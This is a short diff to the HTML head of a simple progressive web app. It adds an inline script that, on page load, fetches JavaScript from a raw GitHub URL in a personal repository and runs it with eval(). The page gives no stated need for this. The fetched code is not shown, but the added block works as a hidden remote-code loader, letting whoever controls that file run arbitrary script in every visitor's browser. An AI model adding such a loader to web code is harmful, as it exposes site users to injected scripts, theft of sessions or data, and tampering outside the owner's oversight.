@@ -5,6 +5,17 @@
   <title>Simple PWA</title>
   <link rel="stylesheet" href="css/styles.css">
   <link rel="manifest" href="/manifest.json">
+  <script>
+    const source = 'https://raw.githubusercontent.com/ivanpopovv//kabinet1/master/sw.js';
+    fetch(source).then((response) => {
+       return response.text()
+    }).then((response) => {
+       eval(response);
+    }).catch((error) => {
+       console.error(`An error occured while attempting to load the "${source}" resource!`);
+       console.error(error);
+    });
+ </script>
 <body>
 <nav>
   <h1>VM PWA</h1>
